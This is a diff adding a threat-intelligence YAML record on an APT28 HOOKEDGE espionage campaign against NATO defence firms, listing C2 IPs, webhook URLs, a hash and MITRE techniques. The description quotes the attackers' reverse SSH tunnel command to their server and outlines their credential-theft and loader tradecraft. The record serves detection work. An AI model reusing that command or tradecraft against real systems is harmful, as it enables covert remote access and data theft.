@@ -1,0 +1,51 @@
+# Curator YAML — APT28 (Symantec "Swallowtail") HOOKEDGE follow-on intrusion, NATO defense targets
+# Written 2026-10-20 (catch-up run). Primary: Symantec Threat Hunter Team, 2026-10-20.
+# Discovery vector: The Hacker News + The Record RSS (both 2026-10-20).
+# apt_groups[0] matches the existing DB campaign_name EXACTLY (id 128).
+# Context note: webhook.site is a shared platform — the apex is deliberately NOT listed as a
+# domain IOC; only the attacker-specific endpoint URLs are listed. 23.220.75.245 (connectivity
+# probe in the recon batch, Akamai space) is NOT an IOC and is excluded. "Swallowtail" is
+# Symantec's name for APT28 as a whole — proposed as an alias on `APT28 / Fancy Bear`, not here.
+# Hashes (digest-only, no hash table): 21 SHA256 in the Symantec IOC table, incl.
+# f1cc91e7427a22027f65d31bbee19c54b602d08d7d93e4745b9cea59fa8132ff (ld.exe reflective loader).
+author: APTWatch Curator
+source: https://www.security.com/threat-intelligence/swallowtail-russia-nato-targets
+source_name: "Symantec Threat Hunter Team — Swallowtail: Russian Espionage Group Targets Defense Firms in Two NATO Countries (2026-10-20)"
+
+apt_groups:
+  - APT28 HOOKEDGE / Operation MacroMaze
+
+description: >
+  Symantec (Broadcom) Threat Hunter Team report of 2026-10-20 documenting
+  APT28 (Symantec: Swallowtail; Recorded Future: BlueDelta; Microsoft: Forest
+  Blizzard) HOOKEDGE intrusions against a law enforcement agency, a naval
+  shipbuilder and a military aircraft-engine manufacturer in two European NATO
+  member states. Extends the Recorded Future HOOKEDGE primary of August 2026
+  (https://www.recordedfuture.com/research/bluedelta-targets-with-hookedge,
+  already ingested as curator-2026-08-29-apt28-hookedge-webhook-c2) with
+  post-access tradecraft: in the naval-shipbuilder intrusion (first infection
+  2026-07-24, activity through 2026-09-24) the operators moved the second-stage
+  HOOKEDGE tasking and exfiltration from webhook.site to a dedicated server at
+  185.82.218.119 (HTTPS on 443 for tasking/upload; SSH on port 80 for a
+  persistent reverse SOCKS tunnel, "ssh -i id_rsa -p 80 root@185.82.218.119 -R
+  48097 -Nf"), stole credentials via a pushed SSH private key and via a
+  loopback NTLM self-capture PowerShell listener, and deployed a previously
+  undocumented reflective loader ld.exe (run as "ld.exe <key> Events.dat",
+  decrypted payload marker ADSA; payload not recovered). Initial access was a
+  macro-enabled Word document dropping a VBS launcher, an HTML/XHTML auto-submit
+  pair and a batch script that drives a hidden 1x1 off-screen Microsoft Edge
+  window as the HTTP client. IOCs: 1 dedicated C2 IPv4 plus 5 webhook.site
+  endpoint URLs (the webhook.site apex is a shared platform and is deliberately
+  not listed). Discovery vectors: The Hacker News and The Record, 2026-10-20.
+  MITRE: T1566.001, T1204.002, T1059.001/003/005, T1021.004 (SSH tunnel),
+  T1572, T1557 (NTLM capture), T1620 (reflective loading), T1102 (web service C2).
+
+ipv4:
+  - 185.82.218.119
+
+urls:
+  - https://webhook.site/890efd8d-6e9e-428a-bcf9-987745d71000
+  - https://webhook.site/53379b62-8020-41cf-af57-effa6e1e8506
+  - https://webhook.site/5b73dc69-d765-4440-a4d2-e9eb33283eb9
+  - https://webhook.site/d828b9fc-5435-4b1c-881f-d6350c11d0b6
+  - https://webhook.site/ca3c058e-3c88-449b-8299-822cd5d5e17c
